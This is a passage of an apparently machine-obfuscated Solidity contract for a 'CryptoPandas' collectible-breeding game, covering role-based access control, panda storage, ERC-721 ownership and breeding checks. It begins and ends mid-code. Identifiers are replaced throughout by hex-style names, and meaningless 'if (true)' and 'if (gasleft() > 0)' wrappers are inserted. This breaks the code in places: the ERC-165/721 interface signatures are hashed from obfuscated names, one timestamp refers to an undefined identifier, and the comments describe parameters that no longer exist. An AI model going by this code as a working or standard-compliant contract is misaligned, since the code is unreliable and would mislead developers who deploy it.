controls access control for CryptoPandas. There are four roles managed here:\n    //\n    //     - The CEO: The CEO can reassign other roles and change the addresses of our dependent smart\n    //         contracts. It is also the only role that can unpause the smart contract. It is initially\n    //         set to the address that created the smart contract in the PandaCore constructor.\n    //\n    //     - The CFO: The CFO can withdraw funds from PandaCore and its auction contracts.\n    //\n    //     - The COO: The COO can release gen0 pandas to auction, and mint promo cats.\n    //\n    // It should be noted that these roles are distinct without overlap in their access abilities, the\n    // abilities listed for each role above are exhaustive. In particular, while the CEO can assign any\n    // address to any role, the CEO address itself doesn't have the ability to act in those roles. This\n    // restriction is intentional so that we aren't tempted to use the CEO address frequently out of\n    // convenience. The less we use an address, the less likely it is that we somehow compromise the\n    // account.\n\n    /// @dev Emited when contract is upgraded - See README.md for updgrade plan\n    event ContractUpgrade(address _0xc51cc9);\n\n    // The addresses of the accounts (or contracts) that can execute actions within each roles.\n    address public _0x9a4ffd;\n    address public _0x5371ec;\n    address public _0x9e5ae2;\n\n    // @dev Keeps track whether the contract is paused. When that is true, most actions are blocked\n    bool public _0x5b0417 = false;\n\n    /// @dev Access modifier for CEO-only functionality\n    modifier _0xb46b56() {\n        require(msg.sender == _0x9a4ffd);\n        _;\n    }\n\n    /// @dev Access modifier for CFO-only functionality\n    modifier _0x586166() {\n        require(msg.sender == _0x5371ec);\n        _;\n    }\n\n    /// @dev Access modifier for COO-only functionality\n    modifier _0xc02dcc() {\n        require(msg.sender == _0x9e5ae2);\n        _;\n    }\n\n    modifier _0x66bdce() {\n        require(\n            msg.sender == _0x9e5ae2 ||\n            msg.sender == _0x9a4ffd ||\n            msg.sender == _0x5371ec\n        );\n        _;\n    }\n\n    /// @dev Assigns a new address to act as the CEO. Only available to the current CEO.\n    /// @param _newCEO The address of the new CEO\n    function _0x55585c(address _0x266ed0) external _0xb46b56 {\n        require(_0x266ed0 != address(0));\n\n        if (true) { _0x9a4ffd = _0x266ed0; }\n    }\n\n    /// @dev Assigns a new address to act as the CFO. Only available to the current CEO.\n    /// @param _newCFO The address of the new CFO\n    function _0x4b7480(address _0xa8270b) external _0xb46b56 {\n        require(_0xa8270b != address(0));\n\n        _0x5371ec = _0xa8270b;\n    }\n\n    /// @dev Assigns a new address to act as the COO. Only available to the current CEO.\n    /// @param _newCOO The address of the new COO\n    function _0x84a7c3(address _0x7415a1) external _0xb46b56 {\n        require(_0x7415a1 != address(0));\n\n        if (gasleft() > 0) { _0x9e5ae2 = _0x7415a1; }\n    }\n\n    /*** Pausable functionality adapted from OpenZeppelin ***/\n\n    /// @dev Modifier to allow actions only when the contract IS NOT paused\n    modifier _0x31b995() {\n        require(!_0x5b0417);\n        _;\n    }\n\n    /// @dev Modifier to allow actions only when the contract IS paused\n    modifier _0xf47ac1 {\n        require(_0x5b0417);\n        _;\n    }\n\n    /// @dev Called by any \"C-level\" role to pause the contract. Used only when\n    function _0x027adb() external _0x66bdce _0x31b995 {\n        if (gasleft() > 0) { _0x5b0417 = true; }\n    }\n\n    /// @dev Unpauses the smart contract. Can only be called by the CEO, since\n    ///  one reason we may pause the contract is when CFO or COO accounts are\n    ///  compromised.\n    /// @notice This is public rather than external so it can be called by\n    ///  derived contracts.\n    function _0xef4a6e() public _0xb46b56 _0xf47ac1 {\n        // can't unpause if contract was upgraded\n        _0x5b0417 = false;\n    }\n}\n\n/// @title Base contract for CryptoPandas. Holds all common structs, events and base variables.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBase is PandaAccessControl {\n    /*** EVENTS ***/\n\n    uint256 public constant GEN0_TOTAL_COUNT = 16200;\n    uint256 public _0x288b09;\n\n    /// @dev The Birth event is fired whenever a new kitten comes into existence. This obviously\n    ///  includes any time a cat is created through the giveBirth method, but it is also called\n    ///  when a new gen0 cat is created.\n    event Birth(address _0xe349a8, uint256 _0xdacb39, uint256 _0xbb3677, uint256 _0xb7adc0, uint256[2] _0xbf1ecd);\n\n    /// @dev Transfer event as defined in current draft of ERC721. Emitted every time a kitten\n    ///  ownership is assigned, including births.\n    event Transfer(address from, address _0xe71485, uint256 _0x329ab7);\n\n    /*** DATA TYPES ***/\n\n    /// @dev The main Panda struct. Every cat in CryptoPandas is represented by a copy\n    ///  of this structure, so great care was taken to ensure that it fits neatly into\n    ///  exactly two 256-bit words. Note that the order of the members in this structure\n    ///  Ref: http://solidity.readthedocs.io/en/develop/miscellaneous.html\n    struct Panda {\n        // The Panda's genetic code is packed into these 256-bits, the format is\n        // sooper-sekret! A cat's genes never change.\n        uint256[2] _0xbf1ecd;\n\n        // The timestamp from the block when this cat came into existence.\n        uint64 _0x795adf;\n\n        // The minimum timestamp after which this cat can engage in breeding\n        // activities again. This same timestamp is used for the pregnancy\n        // timer (for matrons) as well as the siring cooldown.\n        uint64 _0x0221f6;\n\n        // The ID of the parents of this panda, set to 0 for gen0 cats.\n        // Note that using 32-bit unsigned integers limits us to a \"mere\"\n        // 4 billion cats. This number might seem small until you realize\n        // that Ethereum currently has a limit of about 500 million\n        // transactions per year! So, this definitely won't be a problem\n        // for several years (even as Ethereum learns to scale).\n        uint32 _0xbb3677;\n        uint32 _0xb7adc0;\n\n        // Set to the ID of the sire cat for matrons that are pregnant,\n        // zero otherwise. A non-zero value here is how we know a cat\n        // is pregnant. Used to retrieve the genetic material for the new\n        // kitten when the birth transpires.\n        uint32 _0xdb6d0f;\n\n        // Set to the index in the cooldown array (see below) that represents\n        // the current cooldown duration for this Panda. This starts at zero\n        // for gen0 cats, and is initialized to floor(generation/2) for others.\n        // Incremented by one for each successful breeding action, regardless\n        // of whether this cat is acting as matron or sire.\n        uint16 _0x9c1f9e;\n\n        // The \"generation number\" of this cat. Cats minted by the CK contract\n        // for sale are called \"gen0\" and have a generation number of 0. The\n        // generation number of all other cats is the larger of the two generation\n        // numbers of their parents, plus one.\n        // (i.e. max(matron.generation, sire.generation) + 1)\n        uint16 _0x125c0d;\n    }\n\n    /*** CONSTANTS ***/\n\n    /// @dev A lookup table indicating the cooldown duration after any successful\n    ///  breeding action, called \"pregnancy time\" for matrons and \"siring cooldown\"\n    ///  for sires. Designed such that the cooldown roughly doubles each time a cat\n    ///  is bred, encouraging owners not to just keep breeding the same cat over\n    ///  and over again. Caps out at one week (a cat can breed an unbounded number\n    ///  of times, and the maximum cooldown is always seven days).\n    uint32[9] public _0xb6ebec = [\n        uint32(5 minutes),\n        uint32(30 minutes),\n        uint32(2 hours),\n        uint32(4 hours),\n        uint32(8 hours),\n        uint32(24 hours),\n        uint32(48 hours),\n        uint32(72 hours),\n        uint32(7 days)\n    ];\n\n    // An approximation of currently how many seconds are in between blocks.\n    uint256 public _0x0132dd = 15;\n\n    /*** STORAGE ***/\n\n    /// @dev An array containing the Panda struct for all Pandas in existence. The ID\n    ///  of each cat is actually an index into this array. Note that ID 0 is a negacat,\n    ///  the unPanda, the mythical beast that is the parent of all gen0 cats. A bizarre\n    ///  creature that is both matron and sire... to itself! Has an invalid genetic code.\n    ///  In other words, cat ID 0 is invalid... ;-)\n    Panda[] _0xb0b86d;\n\n    /// @dev A mapping from cat IDs to the address that owns them. All cats have\n    ///  some valid owner address, even gen0 cats are created with a non-zero owner.\n    mapping (uint256 => address) public _0x297de9;\n\n    // @dev A mapping from owner address to count of tokens that address owns.\n    //  Used internally inside balanceOf() to resolve ownership count.\n    mapping (address => uint256) _0x9dca6e;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to call\n    ///  transferFrom(). Each Panda can only have one approved address for transfer\n    ///  at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public _0xda3de8;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to use\n    ///  this Panda for siring via breedWith(). Each Panda can only have one approved\n    ///  address for siring at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public _0x752173;\n\n    /// @dev The address of the ClockAuction contract that handles sales of Pandas. This\n    ///  same contract handles both peer-to-peer sales as well as the gen0 sales which are\n    ///  initiated every 15 minutes.\n    SaleClockAuction public _0x09ecb3;\n\n    /// @dev The address of a custom ClockAuction subclassed contract that handles siring\n    ///  auctions. Needs to be separate from saleAuction because the actions taken on success\n    ///  after a sales and siring auction are quite different.\n    SiringClockAuction public _0x721724;\n\n    /// @dev The address of the sibling contract that is used to implement the sooper-sekret\n    ///  genetic combination algorithm.\n    GeneScienceInterface public _0xccef14;\n\n    SaleClockAuctionERC20 public _0xc0ef6f;\n\n    // wizz panda total\n    mapping (uint256 => uint256) public _0x116505;\n    mapping (uint256 => uint256) public _0x05e071;\n\n    /// wizz panda control\n    function _0x7adca5(uint256 _0x921296) view external returns(uint256) {\n        return _0x116505[_0x921296];\n    }\n\n    function _0xf40068(uint256 _0x921296) view external returns(uint256) {\n        return _0x05e071[_0x921296];\n    }\n\n    function _0x0caaa8(uint256 _0x921296,uint256 _0x0d4488) external _0x66bdce {\n        require (_0x116505[_0x921296]==0);\n        require (_0x0d4488==uint256(uint32(_0x0d4488)));\n        _0x116505[_0x921296] = _0x0d4488;\n    }\n\n    function _0x815571(uint256 _0x828784) view external returns(uint256) {\n        Panda memory _0x75303f = _0xb0b86d[_0x828784];\n        return _0xccef14._0xfb5aa1(_0x75303f._0xbf1ecd);\n    }\n\n    /// @dev Assigns ownership of a specific Panda to an address.\n    function _0x336ab1(address _0x82025c, address _0x57cad2, uint256 _0x7651ea) internal {\n\n        _0x9dca6e[_0x57cad2]++;\n        // transfer ownership\n        _0x297de9[_0x7651ea] = _0x57cad2;\n        // When creating new kittens _from is 0x0, but we can't account that address.\n        if (_0x82025c != address(0)) {\n            _0x9dca6e[_0x82025c]--;\n            // once the kitten is transferred also clear sire allowances\n            delete _0x752173[_0x7651ea];\n            // clear any previously approved ownership exchange\n            delete _0xda3de8[_0x7651ea];\n        }\n        // Emit the transfer event.\n        Transfer(_0x82025c, _0x57cad2, _0x7651ea);\n    }\n\n    /// @dev An internal method that creates a new panda and stores it. This\n    ///  method doesn't do any checking and should only be called when the\n    ///  input data is known to be valid. Will generate both a Birth event\n    ///  and a Transfer event.\n    /// @param _matronId The panda ID of the matron of this cat (zero for gen0)\n    /// @param _sireId The panda ID of the sire of this cat (zero for gen0)\n    /// @param _generation The generation number of this cat, must be computed by caller.\n    /// @param _genes The panda's genetic code.\n    /// @param _owner The inital owner of this cat, must be non-zero (except for the unPanda, ID 0)\n    function _0xaeb255(\n        uint256 _0x3ca881,\n        uint256 _0x573631,\n        uint256 _0x6f15c7,\n        uint256[2] _0xb6ca44,\n        address _0xa17562\n    )\n        internal\n        returns (uint)\n    {\n        // These requires are not strictly necessary, our calling code should make\n        // sure that these conditions are never broken. However! _createPanda() is already\n        // an expensive call (for storage), and it doesn't hurt to be especially careful\n        // to ensure our data structures are always valid.\n        require(_0x3ca881 == uint256(uint32(_0x3ca881)));\n        require(_0x573631 == uint256(uint32(_0x573631)));\n        require(_0x6f15c7 == uint256(uint16(_0x6f15c7)));\n\n        // New panda starts with the same cooldown as parent gen/2\n        uint16 _0x9c1f9e = 0;\n        // when contract creation, geneScience ref is null\n        if (_0xb0b86d.length>0){\n            uint16 _0xe8cd7e = uint16(_0xccef14._0xca443f(_0xb6ca44));\n            if (_0xe8cd7e==0) {\n                _0xe8cd7e = 1;\n            }\n            _0x9c1f9e = 1000/_0xe8cd7e;\n            if (_0x9c1f9e%10 < 5){\n                _0x9c1f9e = _0x9c1f9e/10;\n            }else{\n                _0x9c1f9e = _0x9c1f9e/10 + 1;\n            }\n            _0x9c1f9e = _0x9c1f9e - 1;\n            if (_0x9c1f9e > 8) {\n                _0x9c1f9e = 8;\n            }\n            uint256 _0x921296 = _0xccef14._0xfb5aa1(_0xb6ca44);\n            if (_0x921296>0 && _0x116505[_0x921296]<=_0x05e071[_0x921296]) {\n                _0xb6ca44 = _0xccef14._0x83e71a(_0xb6ca44);\n                _0x921296 = 0;\n            }\n            // gensis panda cooldownIndex should be 24 hours\n            if (_0x921296 == 1){\n                _0x9c1f9e = 5;\n            }\n\n            // increase wizz counter\n            if (_0x921296>0){\n                _0x05e071[_0x921296] = _0x05e071[_0x921296] + 1;\n            }\n            // all gen0&gen1 except gensis\n            if (_0x6f15c7 <= 1 && _0x921296 != 1){\n                require(_0x288b09<GEN0_TOTAL_COUNT);\n                _0x288b09++;\n            }\n        }\n\n        Panda memory _0x6ded2b = Panda({\n            _0xbf1ecd: _0xb6ca44,\n            _0x795adf: uint64(_0xa86656),\n            _0x0221f6: 0,\n            _0xbb3677: uint32(_0x3ca881),\n            _0xb7adc0: uint32(_0x573631),\n            _0xdb6d0f: 0,\n            _0x9c1f9e: _0x9c1f9e,\n            _0x125c0d: uint16(_0x6f15c7)\n        });\n        uint256 _0x44ab83 = _0xb0b86d.push(_0x6ded2b) - 1;\n\n        // It's probably never going to happen, 4 billion cats is A LOT, but\n        // let's just be 100% sure we never let this happen.\n        require(_0x44ab83 == uint256(uint32(_0x44ab83)));\n\n        // emit the birth event\n        Birth(\n            _0xa17562,\n            _0x44ab83,\n            uint256(_0x6ded2b._0xbb3677),\n            uint256(_0x6ded2b._0xb7adc0),\n            _0x6ded2b._0xbf1ecd\n        );\n\n        // This will assign ownership, and also emit the Transfer event as\n        // per ERC721 draft\n        _0x336ab1(0, _0xa17562, _0x44ab83);\n\n        return _0x44ab83;\n    }\n\n    // Any C-level can fix how many seconds per blocks are currently observed.\n    function _0x7e03f0(uint256 _0x174340) external _0x66bdce {\n        require(_0x174340 < _0xb6ebec[0]);\n        if (gasleft() > 0) { _0x0132dd = _0x174340; }\n    }\n}\n/// @title The external contract that is responsible for generating metadata for the pandas,\n///  it has one function that will return the data as bytes.\ncontract ERC721Metadata {\n    /// @dev Given a token Id, returns a byte array that is supposed to be converted into string.\n    function _0x92564a(uint256 _0x7651ea, string) public view returns (bytes32[4] _0xb5914d, uint256 _0x3aff36) {\n        if (_0x7651ea == 1) {\n            _0xb5914d[0] = \"Hello World! :D\";\n            if (gasleft() > 0) { _0x3aff36 = 15; }\n        } else if (_0x7651ea == 2) {\n            _0xb5914d[0] = \"I would definitely choose a medi\";\n            _0xb5914d[1] = \"um length string.\";\n            if (true) { _0x3aff36 = 49; }\n        } else if (_0x7651ea == 3) {\n            _0xb5914d[0] = \"Lorem ipsum dolor sit amet, mi e\";\n            _0xb5914d[1] = \"st accumsan dapibus augue lorem,\";\n            _0xb5914d[2] = \" tristique vestibulum id, libero\";\n            _0xb5914d[3] = \" suscipit varius sapien aliquam.\";\n            _0x3aff36 = 128;\n        }\n    }\n}\n\n/// @title The facet of the CryptoPandas core contract that manages ownership, ERC-721 (draft) compliant.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev Ref: https://github.com/ethereum/EIPs/issues/721\n///  See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaOwnership is PandaBase, ERC721 {\n\n    /// @notice Name and symbol of the non fungible token, as defined in ERC721.\n    string public constant _0x7e5a67 = \"PandaEarth\";\n    string public constant _0x905f37 = \"PE\";\n\n    bytes4 constant InterfaceSignature_ERC165 =\n        bytes4(_0x8109f2('_0xc88e1a(bytes4)'));\n\n    bytes4 constant InterfaceSignature_ERC721 =\n        bytes4(_0x8109f2('_0x7e5a67()')) ^\n        bytes4(_0x8109f2('_0x905f37()')) ^\n        bytes4(_0x8109f2('_0x587faa()')) ^\n        bytes4(_0x8109f2('_0xe105b2(address)')) ^\n        bytes4(_0x8109f2('_0x2aab77(uint256)')) ^\n        bytes4(_0x8109f2('_0x720bc2(address,uint256)')) ^\n        bytes4(_0x8109f2('transfer(address,uint256)')) ^\n        bytes4(_0x8109f2('_0xeaa4ff(address,address,uint256)')) ^\n        bytes4(_0x8109f2('_0x770f01(address)')) ^\n        bytes4(_0x8109f2('tokenMetadata(uint256,string)'));\n\n    /// @notice Introspection interface as per ERC-165 (https://github.com/ethereum/EIPs/issues/165).\n    ///  Returns true for any standardized interfaces implemented by this contract. We implement\n    ///  ERC-165 (obviously!) and ERC-721.\n    function _0xc88e1a(bytes4 _0x326f7f) external view returns (bool)\n    {\n        // DEBUG ONLY\n        //require((InterfaceSignature_ERC165 == 0x01ffc9a7) && (InterfaceSignature_ERC721 == 0x9a20483d));\n\n        return ((_0x326f7f == InterfaceSignature_ERC165) || (_0x326f7f == InterfaceSignature_ERC721));\n    }\n\n    // Internal utility functions: These functions all assume that their input arguments\n    // are valid. We leave it to public methods to sanitize their inputs and follow\n    // the required logic.\n\n    /// @dev Checks if a given address is the current owner of a particular Panda.\n    /// @param _claimant the address we are validating against.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _0x1e9a1b(address _0x5a3786, uint256 _0x7651ea) internal view returns (bool) {\n        return _0x297de9[_0x7651ea] == _0x5a3786;\n    }\n\n    /// @dev Checks if a given address currently has transferApproval for a particular Panda.\n    /// @param _claimant the address we are confirming kitten is approved for.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _0x68fddb(address _0x5a3786, uint256 _0x7651ea) internal view returns (bool) {\n        return _0xda3de8[_0x7651ea] == _0x5a3786;\n    }\n\n    /// @dev Marks an address as being approved for transferFrom(), overwriting any previous\n    ///  approval. Setting _approved to address(0) clears all transfer approval.\n    ///  NOTE: _approve() does NOT send the Approval event. This is intentional because\n    ///  _approve() and transferFrom() are used together for putting Pandas on auction, and\n    ///  there is no value in spamming the log with Approval events in that case.\n    function _0xd8a11d(uint256 _0x7651ea, address _0xf918aa) internal {\n        _0xda3de8[_0x7651ea] = _0xf918aa;\n    }\n\n    /// @notice Returns the number of Pandas owned by a specific address.\n    /// @param _owner The owner address to check.\n    /// @dev Required for ERC-721 compliance\n    function _0xe105b2(address _0xa17562) public view returns (uint256 _0x3aff36) {\n        return _0x9dca6e[_0xa17562];\n    }\n\n    /// @notice Transfers a Panda to another address. If transferring to a smart\n    ///  contract be VERY CAREFUL to ensure that it is aware of ERC-721 (or\n    ///  CryptoPandas specifically) or your Panda may be lost forever. Seriously.\n    /// @param _to The address of the recipient, can be a user or contract.\n    /// @param _tokenId The ID of the Panda to transfer.\n    /// @dev Required for ERC-721 compliance.\n    function transfer(\n        address _0x57cad2,\n        uint256 _0x7651ea\n    )\n        external\n        _0x31b995\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_0x57cad2 != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_0x57cad2 != address(this));\n        // Disallow transfers to the auction contracts to prevent accidental\n        // misuse. Auction contracts should only take ownership of pandas\n        // through the allow + transferFrom flow.\n        require(_0x57cad2 != address(_0x09ecb3));\n        require(_0x57cad2 != address(_0x721724));\n\n        // You can only send your own cat.\n        require(_0x1e9a1b(msg.sender, _0x7651ea));\n\n        // Reassign ownership, clear pending approvals, emit Transfer event.\n        _0x336ab1(msg.sender, _0x57cad2, _0x7651ea);\n    }\n\n    /// @notice Grant another address the right to transfer a specific Panda via\n    ///  transferFrom(). This is the preferred flow for transfering NFTs to contracts.\n    /// @param _to The address to be granted transfer approval. Pass address(0) to\n    ///  clear all approvals.\n    /// @param _tokenId The ID of the Panda that can be transferred if this call succeeds.\n    /// @dev Required for ERC-721 compliance.\n    function _0x720bc2(\n        address _0x57cad2,\n        uint256 _0x7651ea\n    )\n        external\n        _0x31b995\n    {\n        // Only an owner can grant transfer approval.\n        require(_0x1e9a1b(msg.sender, _0x7651ea));\n\n        // Register the approval (replacing any previous approval).\n        _0xd8a11d(_0x7651ea, _0x57cad2);\n\n        // Emit approval event.\n        Approval(msg.sender, _0x57cad2, _0x7651ea);\n    }\n\n    /// @notice Transfer a Panda owned by another address, for which the calling address\n    ///  has previously been granted transfer approval by the owner.\n    /// @param _from The address that owns the Panda to be transfered.\n    /// @param _to The address that should take ownership of the Panda. Can be any address,\n    ///  including the caller.\n    /// @param _tokenId The ID of the Panda to be transferred.\n    /// @dev Required for ERC-721 compliance.\n    function _0xeaa4ff(\n        address _0x82025c,\n        address _0x57cad2,\n        uint256 _0x7651ea\n    )\n        external\n        _0x31b995\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_0x57cad2 != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_0x57cad2 != address(this));\n        // Check for approval and valid ownership\n        require(_0x68fddb(msg.sender, _0x7651ea));\n        require(_0x1e9a1b(_0x82025c, _0x7651ea));\n\n        // Reassign ownership (also clears pending approvals and emits Transfer event).\n        _0x336ab1(_0x82025c, _0x57cad2, _0x7651ea);\n    }\n\n    /// @notice Returns the total number of Pandas currently in existence.\n    /// @dev Required for ERC-721 compliance.\n    function _0x587faa() public view returns (uint) {\n        return _0xb0b86d.length - 1;\n    }\n\n    /// @notice Returns the address currently assigned ownership of a given Panda.\n    /// @dev Required for ERC-721 compliance.\n    function _0x2aab77(uint256 _0x7651ea)\n        external\n        view\n        returns (address _0xe349a8)\n    {\n        _0xe349a8 = _0x297de9[_0x7651ea];\n\n        require(_0xe349a8 != address(0));\n    }\n\n    /// @notice Returns a list of all Panda IDs assigned to an address.\n    /// @param _owner The owner whose Pandas we are interested in.\n    /// @dev This method MUST NEVER be called by smart contract code. First, it's fairly\n    ///  expensive (it walks the entire Panda array looking for cats belonging to owner),\n    ///  but it also returns a dynamic array, which is only supported for web3 calls, and\n    ///  not contract-to-contract calls.\n    function _0x770f01(address _0xa17562) external view returns(uint256[] _0x7f66a6) {\n        uint256 _0x8646e7 = _0xe105b2(_0xa17562);\n\n        if (_0x8646e7 == 0) {\n            // Return an empty array\n            return new uint256[](0);\n        } else {\n            uint256[] memory _0x4b9aea = new uint256[](_0x8646e7);\n            uint256 _0x659d22 = _0x587faa();\n            uint256 _0x6012da = 0;\n\n            // We count on the fact that all cats have IDs starting at 1 and increasing\n            // sequentially up to the totalCat count.\n            uint256 _0x45d7f7;\n\n            for (_0x45d7f7 = 1; _0x45d7f7 <= _0x659d22; _0x45d7f7++) {\n                if (_0x297de9[_0x45d7f7] == _0xa17562) {\n                    _0x4b9aea[_0x6012da] = _0x45d7f7;\n                    _0x6012da++;\n                }\n            }\n\n            return _0x4b9aea;\n        }\n    }\n\n    /// @dev Adapted from memcpy() by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _0xde1337(uint _0xa7b436, uint _0x100d10, uint _0xec5c4a) private view {\n        // Copy word-length chunks while possible\n        for(; _0xec5c4a >= 32; _0xec5c4a -= 32) {\n            assembly {\n                mstore(_0xa7b436, mload(_0x100d10))\n            }\n            _0xa7b436 += 32;\n            _0x100d10 += 32;\n        }\n\n        // Copy remaining bytes\n        uint256 _0xd0ff32 = 256 ** (32 - _0xec5c4a) - 1;\n        assembly {\n            let _0x0342e0 := and(mload(_0x100d10), not(_0xd0ff32))\n            let _0x6c5d68 := and(mload(_0xa7b436), _0xd0ff32)\n            mstore(_0xa7b436, or(_0x6c5d68, _0x0342e0))\n        }\n    }\n\n    /// @dev Adapted from toString(slice) by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _0x5fc38a(bytes32[4] _0xe425f4, uint256 _0x000c6c) private view returns (string) {\n        var _0xdba98f = new string(_0x000c6c);\n        uint256 _0x827792;\n        uint256 _0xbed2b6;\n\n        assembly {\n            _0x827792 := add(_0xdba98f, 32)\n            _0xbed2b6 := _0xe425f4\n        }\n\n        _0xde1337(_0x827792, _0xbed2b6, _0x000c6c);\n\n        return _0xdba98f;\n    }\n\n}\n\n/// @title A facet of PandaCore that manages Panda siring, gestation, and birth.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBreeding is PandaOwnership {\n\n    uint256 public constant GENSIS_TOTAL_COUNT = 100;\n\n    /// @dev The Pregnant event is fired when two cats successfully breed and the pregnancy\n    ///  timer begins for the matron.\n    event Pregnant(address _0xe349a8, uint256 _0xbb3677, uint256 _0xb7adc0, uint256 _0x0221f6);\n    /// @dev The Abortion event is fired when two cats breed failed.\n    event Abortion(address _0xe349a8, uint256 _0xbb3677, uint256 _0xb7adc0);\n\n    /// @notice The minimum payment required to use breedWithAuto(). This fee goes towards\n    ///  the gas cost paid by whatever calls giveBirth(), and can be dynamically updated by\n    ///  the COO role as the gas price changes.\n    uint256 public _0x2cfff6 = 2 finney;\n\n    // Keeps track of number of pregnant pandas.\n    uint256 public _0xc24ce3;\n\n    mapping(uint256 => address) _0xa1466f;\n\n    /// @dev Update the address of the genetic contract, can only be called by the CEO.\n    /// @param _address An address of a GeneScience contract instance to be used from this point forward.\n    function _0x368239(address _0x35911f) external _0xb46b56 {\n        GeneScienceInterface _0x1dde86 = GeneScienceInterface(_0x35911f);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(_0x1dde86._0xf36431());\n\n        // Set the new contract address\n        _0xccef14 = _0x1dde86;\n    }\n\n    /// @dev Checks that a given kitten is able to breed. Requires that the\n    ///  current cooldown is finished (for sires) and also checks that there is\n    ///  no pending pregnancy.\n    function _0xe5c961(Panda _0x91bc96) internal view returns(bool) {\n        // In addition to checking the cooldownEndBlock, we also need to check to see if\n        // the cat has a pending birth; there can be some period of time between the end\n        // of the pregnacy timer and the birth event.\n        return (_0x91bc96._0xdb6d0f == 0) && (_0x91bc96._0x0221f6 <= uint64(block.number));\n    }\n\n    /// @dev Check if a sire has authorized breeding with this matron. True if both sire\n    ///  and matron have the same owner, or if the sire has given siring permission to\n    ///  the matron's owner (via approveSiring()).\n    function _0x9b716d(uint256 _0x573631, uint256 _0x3ca881) internal view returns(bool) {\n        address _0x5d6a0c = _0x297de9[_0x3ca881];\n        address _0xb48c38 = _0x297de9[_0x573631];\n\n        // Siring is okay if they have same owner, or if the matron's owner was given\n        // permission to breed with this sire.\n        return (_0x5d6a0c == _0xb48c38 || _0x752173[_0x573631] == _0x5d6a0c);\n    }\n\n    /// @dev Set the cooldownEndTime for the given Panda, based on its current cooldownIndex.\n    ///  Also increments the cooldownIndex (unless it has hit the cap).\n    /// @param _kitten A reference to the Panda in storage which needs its timer started.\n    function _0xd1ee50(Panda storage _0x78c8ab) internal {\n        // Compute an estimation of the cooldown time in blocks (based on current cooldownIndex).\n        _0x78c8ab._0x0221f6 = uint64((_0xb6ebec[_0x78c8ab._0x9c1f9e] / _0x0132dd) + block.number);\n\n        // Increment the breeding count, clamping it at 13, which is the length of the\n        // cooldowns array. We could check the array size dynamically, but hard-coding\n        // this as a constant saves gas. Yay, Solidity!\n        if (_0x78c8ab._0x9c1f9e < 8 && _0xccef14._0xfb5aa1(_0x78c8ab._0xbf1ecd) != 1) {\n            _0x78c8ab._0x9c1f9e += 1;\n        }\n    }\n\n    /// @notice Grants approval to another user to sire with one of your Pandas.\n    /// @param _addr The address that will be able to sire with your Panda. Set to\n    ///  address(0) to clear all siring approvals for this Panda.\n    /// @param _sireId A Panda that you own that _addr will now be able to sire with.\n    function _0xedba04(address _0x4bb4cd, uint256 _0x573631)\n    external\n    _0x31b995 {\n        require(_0x1e9a1b(msg.sender, _0x573631));\n        _0x752173[_0x573631] = _0x4bb4cd;\n    }\n\n    /// @dev Updates the minimum payment required for calling giveBirthAuto(). Can only\n    ///  be called by the COO address. (This fee is used to offset the gas cost incurred\n    ///  by the autobirth daemon).\n    function _0x56306d(uint256 _0x50b9f8) external _0xc02dcc {\n        _0x2cfff6 = _0x50b9f8;\n    }\n\n    /// @dev Checks to see if a given Panda is pregnant and (if so) if the gestation\n    ///  period has passed.\n    function _0x41b298(Panda _0x05f201) private view returns(bool) {\n        return (_0x05f201._0xdb6d0f != 0) && (_0x05f201._0x0221f6 <= uint64(block.number));\n    }\n\n    /// @notice Checks that a given kitten is able to breed (i.e. it is not pregnant or\n    ///  in the middle of a siring cooldown).\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function _0x06d8b0(uint256 _0x645c2f)\n    public\n    view\n    returns(bool) {\n        require(_0x645c2f > 0);\n        Panda storage _0x272bcd = _0xb0b86d[_0x645c2f];\n        return _0xe5c961(_0x272bcd);\n    }\n\n    /// @dev Checks whether a panda is currently pregnant.\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function _0x07398f(uint256 _0x645c2f)\n    public\n    view\n    returns(bool) {\n        require(_0x645c2f > 0);\n        // A panda is pregnant if and only if this field is set\n        return _0xb0b86d[_0x645c2f]._0xdb6d0f != 0;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair. DOES NOT\n    ///  check ownership permissions (that is up to the caller).\n    /// @param _matron A reference to the Panda struct of the potential matron.\n    /// @param _matronId The matron's ID.\n    /// @param _sire A reference to the Panda struct of the potential sire.\n    /// @param _sireId The sire's ID\n    function _0x7e7fb8(\n        Panda storage _0x05f201,\n        uint256 _0x3ca881,\n        Panda storage _0x59c0ac,\n        uint256 _0x573631\n    )\n    private\n    view\n    returns(bool) {\n        // A Panda can't breed with itself!\n        if (_0x3ca881 == _0x573631) {\n            return false;\n        }\n\n        // Pandas can't breed with their parents.\n        if (_0x05f201._0xbb3677 == _0x573631 || _0x05f201._0xb7adc0 == _0x573631) {\n            return false;\n        }\n        if (_0x59c0ac._0xbb3677 == _0x3ca881 || 